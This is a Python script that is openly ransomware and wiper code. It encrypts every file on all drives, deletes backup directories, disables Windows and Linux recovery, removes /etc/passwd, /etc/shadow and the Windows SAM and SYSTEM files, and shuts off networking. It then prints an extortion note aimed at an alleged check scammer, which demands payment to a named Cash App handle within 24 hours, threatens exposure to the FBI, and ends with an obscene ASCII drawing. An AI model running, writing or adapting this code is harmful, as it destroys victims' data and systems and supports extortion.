#!/usr/bin/env python3

import os
import shutil
import subprocess
from cryptography.fernet import Fernet
import platform

# Function to find all files in a directory
def find_files(directory):
    files = []
    for root, dirs, file_list in os.walk(directory):
        for file_name in file_list:
            if file_name in ["main.py", "thekey.key", "decrypt.py"]:
                continue
            files.append(os.path.join(root, file_name))
    return files

# Function to get all root directories for encryption
def get_root_directories():
    if platform.system() == "Windows":
        drives = []
        for drive in range(65, 91):
            if os.path.exists(chr(drive) + ':\\'):
                drives.append(chr(drive) + ':\\')
        return drives
    else:
        return ['/']

# Finding all files starting from root directories
files = []
for root_dir in get_root_directories():
    files.extend(find_files(root_dir))

print("Files to be encrypted:", files)

# Generating a key
key = Fernet.generate_key()

# Saving the key to a file
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Encrypting all the files found
for file in files:
    try:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
        print(f"Encrypted {file}")
    except Exception as e:
        print(f"Skipping file {file} due to {e}")

print("Encryption process completed.")

# Remove system backups and disable recovery options (DANGEROUS)
def remove_backups():
    backup_paths = {
        "Linux": ["/var/backups", "/mnt/backup", "/etc/backups"],
        "Windows": [os.path.join(os.getenv("ProgramData"), "Microsoft\\Windows\\SystemData\\S-1-5-18\\AppData\\Roaming\\Microsoft\\Windows\\Libraries\\Backups"),
                    os.path.join(os.getenv("ProgramData"), "Microsoft\\Windows\\SystemData\\S-1-5-18\\AppData\\Local\\Microsoft\\Windows\\Libraries\\Backups")]
    }
    paths = backup_paths.get(platform.system(), [])
    for path in paths:
        try:
            shutil.rmtree(path)
            print(f"Removed backup at {path}")
        except Exception as e:
            print(f"Could not remove backup at {path} due to {e}")

def disable_recovery():
    if platform.system() == "Windows":
        try:
            subprocess.run(["bcdedit", "/set", "{default}", "recoveryenabled", "No"], check=True)
            print("Disabled Windows recovery")
        except Exception as e:
            print(f"Could not disable Windows recovery due to {e}")
    elif platform.system() == "Linux":
        try:
            subprocess.run(["systemctl", "disable", "--now", "recovery"], check=True)
            print("Disabled Linux recovery")
        except Exception as e:
            print(f"Could not disable Linux recovery due to {e}")

# Delete important system files (DANGEROUS)
def delete_important_files():
    important_files = {
        "Linux": ["/etc/passwd", "/etc/shadow"],
        "Windows": [os.path.join(os.getenv("SystemRoot"), "System32\\config\\SAM"),
                    os.path.join(os.getenv("SystemRoot"), "System32\\config\\SYSTEM")]
    }
    files = important_files.get(platform.system(), [])
    for file in files:
        try:
            os.remove(file)
            print(f"Deleted {file}")
        except Exception as e:
            print(f"Could not delete {file} due to {e}")

# Disable network interfaces (DANGEROUS)
def disable_network():
    if platform.system() == "Windows":
        try:
            subprocess.run(["netsh", "interface", "set", "interface", "Ethernet", "admin=disable"], check=True)
            print("Disabled network interface on Windows")
        except Exception as e:
            print(f"Could not disable network interfaces on Windows due to {e}")
    elif platform.system() == "Linux":
        try:
            subprocess.run(["nmcli", "networking", "off"], check=True)
            print("Disabled network interfaces on Linux")
        except Exception as e:
            print(f"Could not disable network interfaces on Linux due to {e}")

# Execute catastrophic actions
remove_backups()
disable_recovery()
delete_important_files()
disable_network()

print("Catastrophic actions completed.")




#TODO: encrypt all files outside of directory





print("Didnt your mom ever tell you to not scam innocent people?")
print("All of your files have been encrypted. You will cashapp me ($SBussisoDube) the ammount you have written for the fraudulent check you sent me via email ($7,425.79 USD)")
print("not only are your files encrypted I also have information on who you are and your real location despite your efforts to hide them")
print("You are smart but I am smarter")
print("if you fail to do so I will hand everything over to the FBI including your real identity and location which will then be handled by the proper authorities to reach you.")
print("you have 24 hours to respond")
print("you will respond via the same email thread you sent the counterfit check")
print("failure to respond as instructed will result in total system termination")
bird = """

░░░░░░░░░░░░░░░▄▄░░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
██████▄███▄████░░███▄░░░░░░░
▓▓▓▓▓▓█░░░█░░░█░░█░░░███░░░░
▓▓▓▓▓▓█░░░█░░░█░░█░░░█░░█░░░
▓▓▓▓▓▓█░░░░░░░░░░░░░░█░░█░░░
▓▓▓▓▓▓█░░░░░░░░░░░░░░░░█░░░░
▓▓▓▓▓▓█░░░░░░░░░░░░░░██░░░░░
▓▓▓▓▓▓█████░░░░░░░░░██░░░░░
█████▀░░░░▀▀████████░░░░░░


"""
print(bird)